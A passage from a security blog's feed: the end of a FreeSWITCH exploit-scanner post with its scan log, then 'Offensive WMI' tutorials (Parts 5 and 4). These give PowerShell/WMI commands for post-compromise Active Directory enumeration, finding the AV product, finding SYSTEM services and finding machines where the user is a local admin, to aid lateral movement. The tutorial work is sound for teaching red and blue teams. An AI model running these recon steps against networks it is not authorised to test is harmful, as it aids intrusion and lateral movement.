</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> presence.winfo
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> message-summary
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> refer
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Starting to listen <span style="color:#66d9ef">for</span> NOTIFY messages <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">60</span> seconds...
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">47</span> Notifications received <span style="color:#66d9ef">for</span> extension <span style="color:#ae81ff">1005</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">39</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">22</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Exploit completed <span style="color:#66d9ef">for</span> CVE-<span style="color:#ae81ff">2021</span>-<span style="color:#ae81ff">41157</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">1005</span>@192.168.0.<span style="color:#ae81ff">107</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5060</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">22</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Writing results to destination directory as JSON...
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">22</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Scan finished at<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">2021</span>-<span style="color:#ae81ff">12</span>-<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">22</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16.475353572</span> <span style="color:#ae81ff">+0530</span> IST m=<span style="color:#ae81ff">+60.041999624</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">22</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Total <span style="color:#ae81ff">1</span> hosts scanned <span style="color:#66d9ef">in</span> 1m0.038729564s.
</span></span></code></pre></div><p>This creates a <code>./pewswitch-results/</code> directory and puts a JSON report of the scan under it. You can find a sample of the report <a href="https://github.com/0xInfection/PewSWITCH/blob/v0.1/pewswitch-results/sample-report.json">here</a>.</p>
<p>There are several other command lines flags available with the tool itself which allows packet customization and other features. Feel free to explore them!</p>
<h2 id="acknowledgements">Acknowledgements</h2>
<p>Credits go out to the team at Enable Security who coordinated the disclosures and came up with excellent advisories which can be found on <a href="https://github.com/signalwire/freeswitch/security/advisories">FreeSWITCH&rsquo;s GitHub</a>. Apart from that, I&rsquo;d like to personally thank Sandro for allowing me to do this research under him and his incredible support and guidance throughout the process. From knowing nothing about telephony to finding bugs in popular RTC implementations, it had been an amazing journey. :)</p>
<p>This brings us to the end of the blog. Cheers! 🥂</p>
]]></content>
        </item>
        
        <item>
            <title>Offensive WMI - Active Directory Enumeration (Part 5)</title>
            <link>https://0xinfection.xyz/posts/offensive-wmi-active-directory-enumeration-part-5/</link>
            <pubDate>Sun, 17 Oct 2021 00:00:00 +0530</pubDate>
            
            <guid>https://0xinfection.xyz/posts/offensive-wmi-active-directory-enumeration-part-5/</guid>
            <description>&lt;p&gt;This blog is the fifth installation of the &amp;ldquo;Offensive WMI&amp;rdquo; series that I&amp;rsquo;ve been writing on, and this post will cover Active Directory enumeration.&lt;/p&gt;
&lt;p&gt;Active Directory (AD) is Microsoft&amp;rsquo;s implementation of a directory and IAM service for Windows domain networks &amp;ndash; which enables admins to manage permissions and access to resources. Anything used for managing multiple resources is handy for administrators, however, the same is also useful for evil-doers in gathering information and lateral movement.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>This blog is the fifth installation of the &ldquo;Offensive WMI&rdquo; series that I&rsquo;ve been writing on, and this post will cover Active Directory enumeration.</p>
<p>Active Directory (AD) is Microsoft&rsquo;s implementation of a directory and IAM service for Windows domain networks &ndash; which enables admins to manage permissions and access to resources. Anything used for managing multiple resources is handy for administrators, however, the same is also useful for evil-doers in gathering information and lateral movement.</p>
<p>It is important to note that there are several ways to interact with any AD environment, but for this blog we&rsquo;ll stick with pure WMI.</p>
<h2 id="ad-and-wmi">AD and WMI</h2>
<p>WMI has a provider called <code>root\directory\ldap</code> which can be used for interaction with the active directory environment. If we try to list the classes under that provider, we can see that there are a lot of classes that come with either of these prefixes, viz. <code>ads_</code> or <code>ds_</code>. The classes starting with <code>ads_</code> are abstract, and the ones with <code>ds_</code> are dynamic (the only ones useful to us since they allow retrieval of instances).</p>
<p>We&rsquo;ll quickly list out the available classes using the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span>Namespace root<span style="color:#960050;background-color:#1e0010">\</span>directory<span style="color:#960050;background-color:#1e0010">\</span>ldap <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> ds_<span style="color:#f92672">*</span> <span style="color:#f92672">-</span>List
</span></span></code></pre></div>
    <img src="classes.png"  alt="classes"  class="center"  />


<p>Let&rsquo;s get started!</p>
<h3 id="finding-the-domain-name">Finding the domain name</h3>
<p>After gaining access to a box on a domain, one of the first steps in basic reconnaissance would be to try to figure out the domain name on which we are on:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span>Namespace root<span style="color:#960050;background-color:#1e0010">\</span>directory<span style="color:#960050;background-color:#1e0010">\</span>ldap <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> ds_domain <span style="color:#f92672">|</span> <span style="color:#66d9ef">select</span> ds_dc,
</span></span><span style="display:flex;"><span>    ds_distinguishedname, pscomputername
</span></span></code></pre></div>
    <img src="basic.png"  alt="basic"  class="center"  />


<p>In the above command, we fetched the domain name, the FQDN, and the name of the computer we&rsquo;re currently on.</p>
<h3 id="getting-the-domain-policy">Getting the domain policy</h3>
<p>Now, let&rsquo;s try to look at the current domain policy. The same class <code>ds_domain</code> can help us out with additional information about the policy:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span>Namespace root<span style="color:#960050;background-color:#1e0010">\</span>directory<span style="color:#960050;background-color:#1e0010">\</span>ldap <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> ds_domain <span style="color:#f92672">|</span> <span style="color:#66d9ef">select</span> ds_lockoutduration,
</span></span><span style="display:flex;"><span>    ds_lockoutobservationwindow, ds_lockoutthreshold, ds_maxpwdage,
</span></span><span style="display:flex;"><span>    ds_minpwdage, ds_minpwdlength, ds_pwdhistorylength, ds_pwdproperties
</span></span></code></pre></div>
    <img src="policy.png"  alt="policy"  class="center"  />


<blockquote>
<p><strong>NOTE:</strong> As you might have noticed, the output of the above command includes a lot of negative values. All the timestamps in the above output are stored as <strong>negative &ldquo;filetimes&rdquo;</strong>, i.e. represented as negative integers of 100 nanosecond timeslices. For example, a time period of 20 minutes would be represented as <code>-12000000000</code>.</p></blockquote>
<p>We can fairly derive that both the lockout duration and lockout observation window is set at 30 mins, while the password expiry duration is infinite, i.e. never expires. The minimum password length is 7, while, the password history length is 24.</p>
<h3 id="finding-the-domain-controller">Finding the domain controller</h3>
<p>Cool, let us try to find out the domain controller. Before that, we should keep in mind that in WMI, different UAC (User Account Control) values are defined via constants. The table below presents a mapping of the UAC values to user types:</p>
<table>
  <thead>
      <tr>
          <th>User Type</th>
          <th>Hex Value</th>
          <th>Constants</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Normal User</td>
          <td>0x200</td>
          <td>512</td>
      </tr>
      <tr>
          <td>Workstation/Server</td>
          <td>0x1000</td>
          <td>4096</td>
      </tr>
      <tr>
          <td>Domain Controller</td>
          <td>0x82000</td>
          <td>532480</td>
      </tr>
  </tbody>
</table>
<p>Now that we know the values, we can easily query the <code>ds_computer</code> class with the following command. Note the usage of the <code>where</code> Powershell utility to find the domain controller via the piped variable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span>Namespace root<span style="color:#960050;background-color:#1e0010">\</span>directory<span style="color:#960050;background-color:#1e0010">\</span>ldap <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> ds_computer <span style="color:#f92672">|</span> <span style="color:#66d9ef">where</span> <span style="color:#960050;background-color:#1e0010">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">$</span>_.ds_useraccountcontrol <span style="color:#f92672">-</span><span style="color:#66d9ef">match</span> <span style="color:#ae81ff">532480</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">select</span> ds_cn, ds_dnshostname, ds_operatingsystem, ds_lastlogon, ds_pwdlastset
</span></span></code></pre></div>
    <img src="dc.png"  alt="policy"  class="center"  />


<p>The output gives us a lot of data about the domain controller (DC), including its name, DNS hostname, OS, last logon timestamp and even the DC&rsquo;s last password update timestamp. All time-based properties in the output are filetimes. You can use <a href="https://www.silisoftware.com/tools/date.php">this neat converter</a> to convert filetimes into human-readable datetime format.</p>
<p>That&rsquo;s a lot of information that we can enumerate with just an ordinary domain user account without admin privileges!</p>
<h3 id="searching-user-accounts">Searching user accounts</h3>
<p>How about user accounts in the domain as well as other domains in trust relationship with the current domain? It is as simple as querying users using the <code>Win32_UserAccount</code> class:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_useraccount <span style="color:#f92672">|</span> <span style="color:#66d9ef">select</span> name, <span style="color:#66d9ef">domain</span>, accounttype
</span></span></code></pre></div>
    <img src="users.png"  alt="policy"  class="center"  />


<p>As you might have already guessed, the <code>AccountType</code> property is a constant value depicting the user type. The table below defines the type of accounts with their constant values:</p>
<table>
  <thead>
      <tr>
          <th>Account Type</th>
          <th>Identifier</th>
          <th>Constant</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Temporary Duplicate Account</td>
          <td><code>UF_TEMP_DUPLICATE_ACCOUNT</code></td>
          <td>256</td>
      </tr>
      <tr>
          <td>Normal Account</td>
          <td><code>UF_NORMAL_ACCOUNT</code></td>
          <td>512</td>
      </tr>
      <tr>
          <td>Interdomain Trust Account</td>
          <td><code>UF_INTERDOMAIN_TRUST_ACCOUNT</code></td>
          <td>2048</td>
      </tr>
      <tr>
          <td>Workstation Trust Account</td>
          <td><code>UF_WORKSTATION_TRUST_ACCOUNT</code></td>
          <td>4096</td>
      </tr>
      <tr>
          <td>Server Trust Account</td>
          <td><code>UF_SERVER_TRUST_ACCOUNT</code></td>
          <td>8192</td>
      </tr>
  </tbody>
</table>
<p>In case we want to filter out just the user accounts for a single domain, we can use the <code>-Filter</code> switch of the cmdlet like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_useraccount <span style="color:#f92672">-</span>Filter <span style="color:#e6db74">&#39;domain=&#34;infected&#34;&#39;</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">select</span> caption
</span></span></code></pre></div>
    <img src="filteruser.png"  alt="policy"  class="center"  />


<h3 id="enumerating-currently-logged-on-users">Enumerating currently logged-on users</h3>
<p>The <code>Win32_LoggedOnUser</code> classes provide information about the logged-on users in that system as well as the domain. To filter out logged-on local users, we can use the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_loggedonuser <span style="color:#f92672">|</span> <span style="color:#66d9ef">where</span> <span style="color:#960050;background-color:#1e0010">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">$</span>_ <span style="color:#f92672">-</span><span style="color:#66d9ef">match</span> <span style="color:#e6db74">&#39;infected&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}</span> <span style="color:#f92672">|</span> foreach <span style="color:#960050;background-color:#1e0010">{</span>[wmi]<span style="color:#960050;background-color:#1e0010">$</span>_.antecedent<span style="color:#960050;background-color:#1e0010">}</span>
</span></span></code></pre></div>
    <img src="log.png"  alt="policy"  class="center"  />


<h3 id="fetching-groups">Fetching groups</h3>
<p>Fetching the groups for a domain is simple as querying the <code>Win32_GroupInDomain</code> class. We&rsquo;ll use a bit of Powershell magic to give us a cleaner output.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_groupindomain <span style="color:#f92672">|</span> foreach <span style="color:#960050;background-color:#1e0010">{</span>[wmi]<span style="color:#960050;background-color:#1e0010">$</span>_.partcomponent<span style="color:#960050;background-color:#1e0010">}</span>
</span></span></code></pre></div>
    <img src="groups.png"  alt="policy"  class="center"  />


<p>The same could be done with the <code>Win32_Group</code> class, but the output would include the local groups as well.</p>
<h3 id="figuring-out-group-memberships">Figuring out group memberships</h3>
<p>Group membership data is provided by the <code>Win32_GroupUser</code> class. The output obtained includes all membership information for the current domain, the trusted domains as well as the trusted forest with bi-directional trust. For our example, let&rsquo;s say we want to fetch the accounts from the &ldquo;Domain Admins&rdquo; group:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_groupuser <span style="color:#f92672">|</span> <span style="color:#66d9ef">where</span> <span style="color:#960050;background-color:#1e0010">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">$</span>_.groupcomponent <span style="color:#f92672">-</span><span style="color:#66d9ef">match</span> <span style="color:#e6db74">&#39;domain admins&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}</span> <span style="color:#f92672">|</span> foreach <span style="color:#960050;background-color:#1e0010">{</span>[wmi]<span style="color:#960050;background-color:#1e0010">$</span>_.partcomponent<span style="color:#960050;background-color:#1e0010">}</span>
</span></span></code></pre></div>
    <img src="groupuser.png"  alt="policy"  class="center"  />


<p>This is equally applicable for the reverse use case. If we want to enumerate the groups that a particular user is in (<code>Administrator</code> in this case), then we can do something like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_groupuser <span style="color:#f92672">|</span> <span style="color:#66d9ef">where</span> <span style="color:#960050;background-color:#1e0010">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">$</span>_.partcomponent <span style="color:#f92672">-</span><span style="color:#66d9ef">match</span> <span style="color:#e6db74">&#39;Administrator&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}</span> <span style="color:#f92672">|</span> foreach <span style="color:#960050;background-color:#1e0010">{</span>[wmi]<span style="color:#960050;background-color:#1e0010">$</span>_.groupcomponent<span style="color:#960050;background-color:#1e0010">}</span>
</span></span></code></pre></div>
    <img src="usergroup.png"  alt="policy"  class="center"  />


<blockquote>
<p><strong>NOTE</strong>: Since we&rsquo;re using Powershell&rsquo;s <code>Where-Object</code> cmdlet, we can use the <code>-match</code> argument efficiently to find any substring within a property. This helps in exploring a lot of possibilities in creatively filtering out things on specific criteria.</p></blockquote>
<h3 id="finding-machines-in-the-domain">Finding machines in the domain</h3>
<p>To get a list of all unique machines in our active directory environment, we can do something like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span>Namespace root<span style="color:#960050;background-color:#1e0010">\</span>directory<span style="color:#960050;background-color:#1e0010">\</span>ldap <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> ds_computer <span style="color:#f92672">|</span> <span style="color:#66d9ef">select</span> ds_cn
</span></span></code></pre></div>
    <img src="pcs.png"  alt="policy"  class="center"  />


<h3 id="enumerating-admin-privileges-across-ad">Enumerating admin privileges across AD</h3>
<p>An important thing to remember is, by default WMI provides remote access only to local administrators. Already noticed the catch there? If we can run WMI commands against a remote computer, it means we have <em>local administrator</em> access on that computer. We can use this information to write a very simple script that can enumerate local administrator privileges on remote computers.</p>
<p>We can chain the output of the last command with a bit of Powershell to achieve the above:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$pcs <span style="color:#f92672">=</span> Get-WmiObject -Namespace root<span style="color:#ae81ff">\d</span>irectory<span style="color:#ae81ff">\l</span>dap -Class ds_computer | <span style="color:#66d9ef">select</span> -ExpandProperty ds_cn
</span></span><span style="display:flex;"><span>foreach <span style="color:#f92672">(</span>$pc in $pcs<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>Get-WmiObject -Class win32_computersystem -ComputerName $pc -ErrorAction silentlycontinue<span style="color:#f92672">)</span>.name
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div>
    <img src="admin.png"  alt="policy"  class="center"  />


<p>Now we have all the boxes on which our user has admin privileges. With this information, things now become super easy for us in lateral movement.</p>
<h2 id="conclusion">Conclusion</h2>
<p>We saw how easily we could enumerate a lot of stuff from an Active Directory environment using a few WMI classes and some Powershell magic. Once again, this blog is not comprehensive and there are a lot of possibilities when it comes to reconnaissance. In our next blog, we&rsquo;ll focus on lateral movement via WMI.</p>
<p>That&rsquo;s it for now folks. I hope you enjoyed reading the blog. Cheers! 🥂</p>
]]></content>
        </item>
        
        <item>
            <title>Offensive WMI - Reconnaissance &amp; Enumeration (Part 4)</title>
            <link>https://0xinfection.xyz/posts/offensive-wmi-reconnaissance-enumeration-part-4/</link>
            <pubDate>Sat, 02 Oct 2021 00:00:00 +0530</pubDate>
            
            <guid>https://0xinfection.xyz/posts/offensive-wmi-reconnaissance-enumeration-part-4/</guid>
            <description>&lt;p&gt;This is the fourth part of the &amp;ldquo;Offensive WMI&amp;rdquo; series which will focus a bit more on information gathering and enumeration. WMI provides a plethora of classes from which we can enumerate a lot of stuff. So let&amp;rsquo;s dive in without wasting any more time.&lt;/p&gt;
&lt;h2 id=&#34;gathering-basic-information&#34;&gt;Gathering basic information&lt;/h2&gt;
&lt;p&gt;In our previous blogs, we have already seen a lot of classes that provide us with valuable information about a system, e.g. &lt;code&gt;StdRegProv&lt;/code&gt; for the registry, &lt;code&gt;Win32_Process&lt;/code&gt; for processes running on the system, &lt;code&gt;Win32_Bios&lt;/code&gt; for BIOS information etc. Let us try exploring a bit more.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>This is the fourth part of the &ldquo;Offensive WMI&rdquo; series which will focus a bit more on information gathering and enumeration. WMI provides a plethora of classes from which we can enumerate a lot of stuff. So let&rsquo;s dive in without wasting any more time.</p>
<h2 id="gathering-basic-information">Gathering basic information</h2>
<p>In our previous blogs, we have already seen a lot of classes that provide us with valuable information about a system, e.g. <code>StdRegProv</code> for the registry, <code>Win32_Process</code> for processes running on the system, <code>Win32_Bios</code> for BIOS information etc. Let us try exploring a bit more.</p>
<h3 id="hostos-info">Host/OS info</h3>
<p>Getting to know the host/OS is a very basic step when it comes to reconnaissance. WMI has two classes, namely <code>Win32_OperatingSystem</code> and <code>Win32_ComputerSystem</code> that provides us with the relevant information. For our example, we&rsquo;ll be filtering out junk to print only the necessary information needed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_computersystem <span style="color:#f92672">-</span>Property bootupstate,username,totalphysicalmemory,systemtype,systemfamily,<span style="color:#66d9ef">domain</span>,dnshostname,oemstringarray
</span></span></code></pre></div>
    <img src="systeminfo.png"  alt="sysinfo"  class="center"  />


<p>So most of the information that we have now helps us in one major thing &ndash; figuring out whether we are in an emulated environment. The bootup state for our current run indicates that the system wasn&rsquo;t booted in fail-safe mode. We can also see that our current user is <code>pew</code> and the box is not a part of any AD domain. We also get the processor architecture and the RAM available for us to use. This is useful for VM detection, for example &ndash; if the number of logical processors is less than 4 and the RAM available is below 2 Gigs, then the probability of the box being a VM is high. Of course, the same data is given away by the <code>SystemFamily</code> and the <code>OEMStringArray</code> properties, but in controlled environments, there might be other indicators as well.</p>
<p>The other class <code>Win32_OperatingSystem</code> too provides us with a lot of useful info:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_operatingsystem <span style="color:#f92672">|</span> fl <span style="color:#f92672">*</span>
</span></span></code></pre></div>
    <img src="os.png"  alt="sysinfo"  class="center"  />


<h3 id="directory-listing">Directory listing</h3>
<p>Listing files on a system is a very fundamental operation. WMI has a class called <code>Win32_Directory</code> that helps in listing the files. Alternatively, there is another class named <code>CIM_DataFile</code> that can also be utilized to achieve the same.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_directory
</span></span></code></pre></div>
    <img src="directory.png"  alt="dir"  class="center"  />


<p>Often searching for file patterns using wildcards is helpful. We can make use of the <code>-Filter</code> argument of the cmdlet to achieve something similar. Let&rsquo;s say we&rsquo;re interested in directory paths that have a folder called <code>snapshots</code>. Querying it with WMI would look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_directory <span style="color:#f92672">-</span>Filter <span style="color:#e6db74">&#39;name LIKE &#34;%snapshots%&#34;&#39;</span>
</span></span></code></pre></div>
    <img src="wildcard.png"  alt="wc"  class="center"  />


<h3 id="av-product">AV product</h3>
<p>One of the first steps when it comes to recon is to enumerate what kind of product is providing security to a system. WMI provides a class called <code>AntiVirusProduct</code> under the <code>root\SecurityCenter2</code> namespace that contains information about the AV installed on the system. In my case, it&rsquo;s the default Windows Defender.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span>Namespace root<span style="color:#960050;background-color:#1e0010">\</span>securitycenter2 <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> antivirusproduct
</span></span></code></pre></div>
    <img src="av.png"  alt="av"  class="center"  />


<h3 id="services">Services</h3>
<p>Services on a Windows system are similar to Unix daemons, or simply non-UI processes running in the background. This is useful information when it comes to privilege escalation, especially, in cases where there is a service created by <code>SYSTEM</code> with weak file permissions.</p>
<p>To list the services, we need to make use of the <code>Win32_Service</code> class. For our example, we&rsquo;ll only print those services which are initiated by the <code>LocalSystem</code> (or the <code>NT Authority\System</code>). Note the usage of the <code>select</code> Powershell utility that expands the output significantly as compared to without it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_service <span style="color:#f92672">-</span>Filter <span style="color:#e6db74">&#39;startname=&#34;localsystem&#34;&#39;</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span>
</span></span></code></pre></div>
    <img src="services.png"  alt="services"  class="center"  />


<p>WMI also provides several methods when it comes to interacting with services. They allow creation, deletion, starting, stopping, resuming, updating and a lot of other capabilities to manipulate the services. To list the methods available under the <code>Win32_Service</code> class, we can use the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_service <span style="color:#f92672">-</span>List <span style="color:#f92672">|</span> <span style="color:#66d9ef">select</span> <span style="color:#f92672">-</span>ExpandProperty methods
</span></span></code></pre></div>
